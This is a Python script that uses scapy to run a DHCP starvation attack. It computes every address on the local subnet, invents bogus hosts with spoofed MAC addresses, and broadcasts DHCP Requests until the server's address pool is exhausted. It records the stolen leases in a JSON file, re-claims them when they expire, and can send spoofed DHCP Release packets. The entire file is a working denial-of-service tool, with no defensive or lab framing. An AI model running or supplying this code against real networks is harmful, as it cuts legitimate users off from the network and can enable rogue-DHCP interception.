# pool.exhaustion.py
# Performs a DHCP server's pool exhaustion, creating and adding acquired IP addresses to a .json file
# 1. Get the interface network parameters such as assigned IP address and netmask to obtain a list of all possible IP addresses on network
# 2. Check json file. If exists, check if bogus hosts' IP address lease time is already current. 
# 3. Decide which addresses need to be spoofed. For every one of those, perform a broadcast Request-Response handshake trying to assign that address to a bogus host
# 4. Save/update all spoofed addresses with it's corresponding bogus host's info to json file


#### IMPORTS #### -------------------------------------------------------------------
import scapy.all as scapy
import time
import json
import threading
import logging
from logging.handlers import TimedRotatingFileHandler
import random
from datetime import datetime
from common import *


#### CONFIG #### -------------------------------------------------------------------
iface = "eth0"  # Network interface to spoof
timeout_to_receive_response = 10 # Time to wait until non response is decided
catch_and_release = False # Debug mode. Pool exhaustion + save results + Load results + Release + Save results
json_file = "/home/pi/dhcp_starver/spoofed_hosts.json" # Where to save the spoofed IP addresses and bogus host's info associated to it
log_file = "/home/pi/dhcp_starver/logs/pool_exhaustion.log"


#### GLOBAL VARIABLES #### ---------------------------------------------------------
# Dict of all spoofed ip addresses k:IP, v:fake_host
#spoofed_ip_dict = dict()

# DHCP Server's IP and MAC address
dhcp_server_ip = ""
dhcp_server_mac = ""

# Our own device's network parameters
our_ip_address = ""
our_mac_address = ""
our_netmask = ""
#our_network = ""


# Define a semaphore for .log/.json file access without collision
file_semaphore = threading.Semaphore()

# Set up logging with rotation policy
handler = TimedRotatingFileHandler(log_file, when="midnight", interval=1, backupCount=7, encoding='utf-8', utc=True)
handler.suffix = "%Y-%m-%d"
handler.setLevel(logging.INFO)
formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
handler.setFormatter(formatter)
logger = logging.getLogger()
logger.addHandler(handler)
logger.setLevel(logging.INFO)

# Set up scapy logger to error
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)


#### FUNCTIONS #### ----------------------------------------------------------------
def write_to_log(message):
    """
    Write message to log file
    """
    with file_semaphore:
        logger.info(message)


def update_json_file(updated_ip_dict, file_path):
        """
        Update json file with new information.
        Load specified file into a dictionary, adds new entries and save it to JSON file.
        """
        try:
            # Load previous results from JSON file
            dict_on_file = load_from_json(file_path, file_semaphore)

            # Update previous results with new hosts' information
            for ip, host in updated_ip_dict.items():
                dict_on_file[ip] = host
            # Save updated results back to the JSON file
            save_to_json(dict_on_file, file_path, file_semaphore)
        except FileNotFoundError as e:
            write_to_log(str(e))
        except json.JSONDecodeError as e:
            write_to_log(f"Error decoding JSON file: {str(e)}")
        except Exception as e:
            write_to_log(f"An unexpected error occurred: {str(e)}")


def check_if_spoof_is_needed(available_hosts):
    """
    Decide if a spoof is needed for every available IP address on the network.
    Retuns a list of IP addresses to be spoofed.
    """

    write_to_log(f"Checking if host spoof is expired")
    try:
        spoofed_ip_dict = load_from_json(json_file, file_semaphore)
    except FileNotFoundError as e:
        write_to_log(str(e))
        spoofed_ip_dict = {}
    except json.JSONDecodeError as e:
        write_to_log(f"Error decoding JSON file: {str(e)}")
        spoofed_ip_dict = {}
    except Exception as e:
        write_to_log(f"An unexpected error occurred: {str(e)}")
        spoofed_ip_dict = {}

    # Return all IP addresses if something goes wrong
    if not spoofed_ip_dict:
        write_to_log(f"Trying to spoof all available IP addresses on network")
        return available_hosts

    try:

        clean_host_dict = remove_expired_spoofed_hosts(spoofed_ip_dict)
        try:
            save_to_json(clean_host_dict, json_file, file_semaphore)
        except FileNotFoundError as e:
            write_to_log(str(e))
        except json.JSONDecodeError as e:
            write_to_log(f"Error decoding JSON file: {str(e)}")
        except Exception as e:
            write_to_log(f"An unexpected error occurred: {str(e)}")

        # Removing already spoofed addresses from all available IP addresses list 
        available_hosts[:] = [ip for ip in available_hosts if ip not in clean_host_dict]
        #for ip, _ in clean_host_dict.items():
        #    available_hosts.remove(ip)
        
        # Removing our own IP address from spoofing
        available_hosts.remove(our_ip_address)

    except Exception as e:

        write_to_log(f"Error during spoof need checking: {e}")

    finally:

        return available_hosts


def remove_expired_spoofed_hosts(host_dict):
    """
    Remove old spoofed host by comparing acquisition time with time now
    """
    time_now = datetime.now()
    addresses_with_expired_spoof = []
    # Check if spoof is out-to-date by comparing acquisition time with lease renewal time
    for ip, host in host_dict.items():
        # Comparing acquisition time to time now
        time_diff = (time_now - host.acquisition_time).total_seconds()
        if time_diff > host.lease_time or not host.is_spoofed:
            addresses_with_expired_spoof.append(ip)
            '''
            # Making sure it's not DHCP server
            if not host.is_server:
                # Spoof is needed
                addresses_with_expired_spoof.append(ip)
                '''
    # Removing non-spoofed hosts from host_dict
    if addresses_with_expired_spoof:
        write_to_log(f"IP addresses that need re-spoofing:")
        for ip in addresses_with_expired_spoof:
            write_to_log(f"{ip}")
            del host_dict[ip]
    
    return host_dict


def handle_dhcp_request_response(packet, host):
    """
    Handles response to DHCP Request packet
    """
    global dhcp_server_ip, dhcp_server_mac
    
    # Option 5: DHCP ACK, IP address successfully linked to host by router's DHCP server        
    if scapy.DHCP in packet and packet[scapy.DHCP].options[0][1] == 5:
        # Getting client info - RFC951
        host_mac = mac_to_str(packet[scapy.BOOTP].chaddr)
        host_ip = packet[scapy.BOOTP].yiaddr
        # Check if packet is not for us. Only captured if device is connected to a mirror port or broadcast ACK
        if host_mac != host.mac_address or host_mac == our_mac_address:
            write_to_log(f"Received unknown DHCP ACK: {host_ip} linked to {host_mac}")
            return None
        # Updating the fake host's attributes with DHCP server's final decision
        dhcp_opts = get_dhcp_options(packet)
        host.ip_address = host_ip
        host.lease_time = dhcp_opts['lease_time']
        host.acquisition_time = datetime.now()
        host.is_spoofed = True
        # Updating DHCP server's params
        dhcp_server_ip = dhcp_opts["server_id"] 
        dhcp_server_mac = packet[scapy.Ether].src
        write_to_log(f"ACK received: {host_ip} successfully linked to {host_mac}")

        return host
    
    # Option 6: DHCP NAK, unable to obtain a dynamic IP address
    elif scapy.DHCP in packet and packet[scapy.DHCP].options[0][1] == 6:
        host_mac = mac_to_str(packet[scapy.BOOTP].chaddr)
        write_to_log(f"NAK received: {host_mac} IP address' acquisition rejected")
        
        return None


def pool_exhaustion_with_request(ip_list):
    """
    Sends an DHCP Request for every IP address on ip_list list
    """
    spoofed_hosts_dict = {}
    for ip in ip_list:
        # Create a new bogus host
        host = fake_host.create_host(ip)
        # Create Broadcast DHCP packet
        dhcp_request_packet = create_broadcast_dhcp_request_packet(host)
        # Sends packet and wait to response
        scapy.sendp(dhcp_request_packet, verbose=False, iface=iface)
        write_to_log(f"Request sent: {host.mac_address} requesting {ip}")
        dhcp_response = scapy.sniff(iface=iface, filter="udp and (port 67 or port 68)", count=1, store=1, timeout=timeout_to_receive_response)
        # Prints 
        #dhcp_response = scapy.sniff(iface=iface, filter="udp and (port 67 or port 68)", count=1, store=1, timeout=10, prn=lambda x: x.sniffed_on+": "+x.summary())

        if dhcp_response:
            # If there's response, check if it's ACK or NAK. If ACK, return is not None and we add the new fake_host to dictionary
            updated_host = handle_dhcp_request_response(dhcp_response[0], host)
            if updated_host != None:
               #global spoofed_ip_dict
               spoofed_hosts_dict[updated_host.ip_address] = updated_host

        else:

            write_to_log(f"Timeout exceeded: Non response received")

    return spoofed_hosts_dict
        

def release_all_ips(host_dict):
    """
    Sends a DHCP Release for every fake host with an IP address linked
    """
    write_to_log(f"Releasing all spoofed IP addresses:")
    #global spoofed_ip_dict
    for ip, host in host_dict.items():
        #if host.is_spoofed:
        send_release(host.mac_address, ip)
        # Updating spoofed host's dict
        host_dict[ip].is_spoofed = False
        time.sleep(0.25)
    write_to_log(f"All IP addresses have been released!")


def send_release(host_mac, ip_address):
    """
    Send DHCP Release
    """
    # Getting a random Trans ID
    trans_id = random.getrandbits(32)
    # Converting MAC addresses
    mac_address = int(host_mac.replace(":", ""), 16).to_bytes(6, "big")
    server_mac = int(dhcp_server_mac.replace(":", ""), 16).to_bytes(6, "big")
    # Making DHCP Release packet
    ether_header = scapy.Ether(src=mac_address, 
                               dst=server_mac)
    ip_header = scapy.IP(src=ip_address, 
                         dst=dhcp_server_ip)
    udp_header = scapy.UDP(sport=68, 
                           dport=67)
    bootp_field = scapy.BOOTP(chaddr=mac_address,
                              ciaddr=ip_address,
                              xid=trans_id,
                              flags=0)
    dhcp_field = scapy.DHCP(options=[("message-type", "release"),
                                     ("server_id", dhcp_server_ip),
                                     "end"])
    dhcp_request = (ether_header/ip_header/udp_header/bootp_field/dhcp_field)

    scapy.sendp(dhcp_request, verbose=False, iface=iface)
    write_to_log(f"Releasing IP address {ip_address} from {host_mac}")


def main():

    write_to_log(f"Starting service")
    # Getting interface parameters
    global our_ip_address, our_mac_address, our_netmask
    our_ip_address, our_mac_address, our_netmask, _ = get_network_params(iface)
    write_to_log(f"Interface {iface} has IPaddr: {our_ip_address}, MACaddr: {our_mac_address} and netmask: {our_netmask}")
    # Getting all host avalaible IP addresses for network
    available_hosts = get_hosts_from_network(our_ip_address, our_netmask)
    # Check previous spoofed host in json file to decide if pool exhaustion is needed for every existing ip address on network
    ip_list_to_spoof = check_if_spoof_is_needed(available_hosts)

    
    # Starting response DHCP packet capture thread
    capture_thread = threading.Thread(target=capture_dhcp_packets)
    capture_thread.daemon = True
    capture_thread.start()

    # Pool exhaustion: getting all avalaible IP from DHCP server's pool
    try:
        write_to_log(f"Starting DHCP Request pool exhaustion")
        spoofed_hosts_dict = pool_exhaustion_with_request(ip_list_to_spoof)
        if not spoofed_hosts_dict:
            write_to_log(f"DHCP Request pool exhaustion failed. Trying with DHCP Discover exhaustion")

        
        write_to_log(f"Pool exhaustion completed")

        # Updating json file with updated host information
        update_json_file(spoofed_hosts_dict, json_file)

        # If True: releases all ip addresses 
        if catch_and_release:
            time.sleep(5)

            try:
                spoofed_hosts_dict = load_from_json(json_file, file_semaphore)
            except FileNotFoundError as e:
                write_to_log(str(e))
                spoofed_hosts_dict = {}
            except json.JSONDecodeError as e:
                write_to_log(f"Error decoding JSON file: {str(e)}")
                spoofed_hosts_dict = {}
            except Exception as e:
                write_to_log(f"An unexpected error occurred: {str(e)}")
                spoofed_hosts_dict = {}

            release_all_ips(spoofed_hosts_dict)
            
            try:
                save_to_json(spoofed_hosts_dict, json_file)
            except FileNotFoundError as e:
                write_to_log(str(e))
            except json.JSONDecodeError as e:
                write_to_log(f"Error decoding JSON file: {str(e)}")
            except Exception as e:
                write_to_log(f"An unexpected error occurred: {str(e)}")
    
    except Exception as e:

        print(e)
        #release_all_ips() 

    finally:
        
        write_to_log(f"Service terminated")
    

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt as e:
        write_to_log(f"Service manually terminated")